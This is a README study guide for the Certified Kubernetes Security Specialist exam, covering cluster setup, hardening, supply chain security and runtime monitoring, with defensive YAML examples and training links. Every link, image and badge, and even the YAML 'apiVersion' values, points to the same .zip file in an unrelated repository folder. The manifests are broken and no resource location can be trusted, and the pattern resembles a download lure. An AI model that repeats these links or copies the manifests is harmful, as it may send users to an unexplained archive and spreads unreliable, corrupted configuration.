[![License: CC BY-SA 4.0](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
[![PRs Welcome](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
# Certified Kubernetes Security Specialist - CKS

<p align="center">
  <img width="360" src="https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip">
</p>

Online curated resources that will help you prepare for taking the Kubernetes Certified Kubernetes Security Specialist **CKS** Certification exam.

- Please raise an issue, or make a pull request for fixes, new additions, or updates.

Resources are primarly cross referenced back to the [allowed CKS sites](#urls-allowed-in-the-extra-single-tab) during the exam as per CNCF/Linux Foundation exam allowed search rules. Videos and other third party resources e.g. blogs will be provided as an optional complimentary material and any 3rd party material not allowed in the exam will be designated with :triangular_flag_on_post: in the curriculum sections below.

Ensure you have the right version of Kubernetes documentation selected (e.g. v1.23 as of 3rd March 2022) especially for API objects and annotations, however for third party tools, you might find that you can still find references for them in old releases and blogs [e.g. Falco install](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip).

* Icons/emoji legend
  - :clipboard:  Expand to see more content
  - :confused:   Verify, not best resource yet
  - :large_blue_circle: Good overall refence, can be used in the exam
  - :triangular_flag_on_post: External third-party resource, can not be used during exam
  - :pencil:  To-do, item that needs further checking(todo list for future research/commits)

## Exam Brief

Offical exam objectives you review and understand in order to pass the test.

* [CNCF Exam Curriculum repository ](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

- Duration : two (2) hours
- Number of questions: 15-20 hands-on performance based tasks
- Passing score: 67%
- Certification validity: two (2) years
- Prerequisite: valid CKA
- Cost: $375 USD, One (1) year exam eligibility, with a free retake within the year.

  *Linux Foundation offer several discounts around the year e.g. CyberMonday, Kubecon attendees among other special holidays/events*

### URLs allowed in the extra single tab
  - From Chrome or Chromium browser to open one additional tab in order to access
    Kubernetes Documentation:
    - https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip and their subdomains
    - https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip and their subdomains
    - https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip and their subdomains

  This includes all available language translations of these pages (e.g. https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
  - Tools:
    - [Trivy documentation](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
    - [Sysdig documentation](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
    - [Falco documentation](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
    - [App Armor documentation](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

## CKS repo topics overview

  - [X] [Cluster Setup - 10%](#cluster-setup---10)
  - [X] [Cluster Hardening - 15%](#cluster-hardening---15)
  - [X] [System Hardening - 15%](#system-hardening---15)
  - [X] [Minimize Microservice Vulnerabilities - 20%](#minimize-microservice-vulnerabilities---20)
  - [X] [Supply Chain Security - 20%](#supply-chain-security---20)
  - [X] [Monitoring, Logging and Runtime Security - 20%](#monitoring-logging-and-runtime-security---20)

  #### Extra helpful material

  - [x] [Slack](#slack)
  - [x] [Books](#books)
  - [x] [Youtube Videos](#youtube-videos)
  - [x] [Webinars](#webinars)
  - [x] [Containers and Kubernetes Security Training](#containers-and-kubernetes-security-training)
  - [x] [Extra Kubernetes security resources](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

<hr style="border:3px solid blue"> </hr>

### Cluster Setup - 10%
:large_blue_circle: [Securing a Cluster](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

1. [Use Network security policies to restrict cluster level access](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
2. :triangular_flag_on_post: [Use CIS benchmark to review the security configuration of Kubernetes components](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)  (etcd, kubelet, kubedns, kubeapi)
    - :triangular_flag_on_post: [Kube-bench](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip) - Checks whether Kubernetes is deployed securely by running the checks documented ain the CIS Kubernetes Benchmark.
3. Properly set up [Ingress objects with security control](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
4. [Protect node metadata and endpoints](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

    <details><summary> Using Kubernetes network policy to restrict pods access to cloud metadata </summary>

      * This example assumes AWS cloud, and metadata IP address is 169.254.169.254 should be blocked while all other external addresses are not.

      ```yaml
      apiVersion: https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip
      kind: NetworkPolicy
      metadata:
        name: deny-only-cloud-metadata-access
      spec:
        podSelector: {}
        policyTypes:
        - Egress
        egress:
        - to:
          - ipBlock:
            cidr: 0.0.0.0/0
            except:
            - 169.254.169.254/32
      ```
    </details>

5. [Minimize use of, and access to, GUI elements](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
6. [Verify platform binaries before deploying](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

     <details><summary> :clipboard:  Kubernetes binaries can be verified by their digest **sha512 hash**  </summary>

     - Checking the Kubernetes release page for the specific release
     - Checking the change log for the [images and their digests](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

     </details>


### Cluster Hardening - 15%

1. [Restrict access to Kubernetes API](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
  - [Control anonymous requests to Kube-apiserver](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
  - [Non secure access to the kube-apiserver](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
2. [Use Role-Based Access Controls to minimize exposure](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
    * :triangular_flag_on_post: [Handy site collects together articles, tools and the official documentation all in one place](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
    * :triangular_flag_on_post: [Simplify Kubernetes Resource Access Control using RBAC Impersonation](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
3. Exercise caution in using service accounts e.g. [disable defaults](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip), minimize permissions on newly created ones

   <details><summary> :clipboard: Opt out of automounting API credentials for a service account </summary>

   #### Opt out at service account scope
   ```yaml
   apiVersion: v1
   kind: ServiceAccount
   metadata:
     name: build-robot
   automountServiceAccountToken: false
   ```
   #### Opt out at pod scope
   ```yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: cks-pod
   spec:
     serviceAccountName: default
     automountServiceAccountToken: false
   ```

   </details>


4. [Update Kubernetes frequently](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

### System Hardening - 15%

1. Minimize host OS footprint (reduce attack surface)

   <details><summary> :clipboard: :confused: Reduce host attack surface </summary>

   * [seccomp which stands for secure computing was originally intended as a means of safely running untrusted compute-bound programs](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
   * [AppArmor can be configured for any application to reduce its potential host attack surface and provide greater in-depth defense.](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
   * [PSP enforces](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
   * Apply host updates
   * Install minimal required OS fingerprint
   * Identify and address open ports
   * Remove unnecessary packages
   * Protect access to data with permissions
     *  [Restirct allowed hostpaths](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

   </details>

2. Minimize IAM roles
   * :confused: [Access authentication and authorization](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
3. Minimize external access to the network

   <details><summary> :clipboard: :confused: if it means deny external traffic to outside the cluster?!! </summary>

   * not tested, however, the thinking is that all pods can talk to all pods in all name spaces but not to the outside of the cluster!!!

   ```yaml
   apiVersion: https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip
   kind: NetworkPolicy
   metadata:
     name: deny-external-egress
   spec:
     podSelector: {}
     policyTypes:
     - Egress
     egress:
       to:
       - namespaceSelector: {}
     ```

    </details>

4. Appropriately use kernel hardening tools such as AppArmor, seccomp
   * [AppArmor](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
   * [Seccomp](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

### Minimize Microservice Vulnerabilities - 20%

1. Setup appropriate OS-level security domains e.g. using PSP, OPA, security contexts
   - [Pod Security Policies](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
   - [Open Policy Agent](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
   - [Security Contexts](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
2. [Manage kubernetes secrets](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
3. Use [container runtime](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip) sandboxes in multi-tenant environments (e.g. [gvisor, kata containers](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip))
4. [Implement pod to pod encryption by use of mTLS](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
  - [ ] :pencil: check if service mesh is part of the CKS exam

### Supply Chain Security - 20%

1. Minimize base image footprint

   <details><summary> :clipboard: Minimize base Image </summary>

   * Use distroless, UBI minimal, Alpine, or relavent to your app nodejs, python but the minimal build.
   * Do not include uncessary software not required for container during runtime e.g build tools and utilities, troubleshooting and debug binaries.
     * :triangular_flag_on_post: [Learnk8s: 3 simple tricks for smaller Docker images](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
      * :triangular_flag_on_post: [GKE 7 best practices for building containers](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

   </details>

2. Secure your supply chain: [whitelist allowed image registries](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip), sign and validate images
  * Using [ImagePolicyWebhook admission Controller](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
4. Use static analysis of user workloads (e.g. [kubernetes resources](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip), docker files)
5. [Scan images for known vulnerabilities](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
    * [Aqua security Trivy]( https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
    * :triangular_flag_on_post: [Anchore command line scans](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
### Monitoring, Logging and Runtime Security - 20%

1. Perform behavioural analytics of syscall process and file activities at the host and container level to detect malicious activities
	- [Falco installation guide](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
	- :triangular_flag_on_post: [Sysdig Falco 101](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
	- :triangular_flag_on_post: [Falco Helm Chart](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
	- :triangular_flag_on_post: [Falco Kubernetes helmchart](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
	- :triangular_flag_on_post: [Detect CVE-2020-8557 using Falco](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
2. Detect threats within a physical infrastructure, apps, networks, data, users and workloads
3. Detect all phases of attack regardless where it occurs and how it spreads

   <details><summary> :clipboard:  Attack Phases </summary>

     - :triangular_flag_on_post: [Kubernetes attack martix Microsoft blog](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
     - :triangular_flag_on_post: [MITRE attack framwork using Falco](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
     - :triangular_flag_on_post: [Lightboard video: Kubernetes attack matrix - 3 steps to mitigating the MITRE ATT&CK Techniques]()
     - :triangular_flag_on_post: [CNCF Webinar: Mitigating Kubernetes attacks](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

   </details>

4. Perform deep analytical investigation and identification of bad actors within the environment
   - [Sysdig documentation](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
   - [Monitoring Kubernetes with sysdig](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
   - :triangular_flag_on_post: [CNCF Webinar: Getting started with container runtime security using Falco](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
5. [Ensure immutability of containers at runtime](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
6. [Use Audit Logs to monitor access](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

<hr style="border:3px solid blue"> </hr>

## Extra helpful material

### Slack

1. [Kubernetes Community - #cks-exam-prep](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
1. [Kubernauts Community - #cks](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
2. [Saiyam's Pathak OpenSource Discord #CKS channel](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)


### Twitch

1. [KubeNativeSecurity twitch stream Talk Shows & Podcasts](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

### Books

1. [Aqua Security Liz Rice:Free Container Security Book](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
1. [Learn Kubernetes security: Securely orchestrate, scale, and manage your microservices in Kubernetes deployments](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
1. [Let's Learn CKS Scenarios](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

### Youtube Videos

1. [Google/Ian Lewis: Kubernetes security best practices](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
1. [Code in Action for the **book Learn Kubernetes Security** playlist](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
1. [Kubernetes security concepts and demos](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)

### Containers and Kubernetes Security Training

1. [https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip CKS practice exam](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip) - use code **walidshaari** for **20%** discount.
1. UDEMY Kim Wüstkamp's [Kubernetes CKS 2021 Complete Course with https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip Simulator **(discounted price)**](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
1. [Linux Foundation Kubernetes Security essentials LFS 260](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
2. [Mumshad's KodeCloud "Certified Kubernetes Security Specialist" CKS and training and labs](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
3. [Linux Academy/ACloudGuru Kubernetes security](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
4. Zeal Vora's Udemy [ Certified Kubernetes Security Specialist 2021 ](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip) - Link includes a discount till 28th January 2021
5. [Cloud native security defending containers and kubernetes](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
6. [Tutorial: Getting Started With Cloud-Native Security - Liz Rice, Aqua Security & Michael Hausenblas](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
    - [Hands-on Tutorial](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
7. [K21 academy CKS step by step activity hands-on-lab activity guide](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
8. [Andrew Martin Control Plane Security training](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
9. [Free Exam simulators from https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip available with CKS certification from Linux Foundation](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
10. [Sysdig Falco 101](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
11. [Killercoda in-browser CKS Playground and Challenges](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip) - FREE

#### Other CKS related repos

1. [Stackrox CKS study guide](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip) - Brief and informative study guide from [Stackrox @mfosterrox](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
2. [Kim's CKS Challenge series](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip) - also posted on medium @ https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip
3. [Abdennour](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
4. [Ibrahim Jelliti](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
5. [Viktor Vedmich](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
6. [Kubernetes Security Checklist and Requirements](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
7. [CKS Exam series](https://raw.githubusercontent.com/joymondal/Certified-Kubernetes-Security-Specialist/main/Lobelia/Certified-Kubernetes-Security-Specialist.zip)
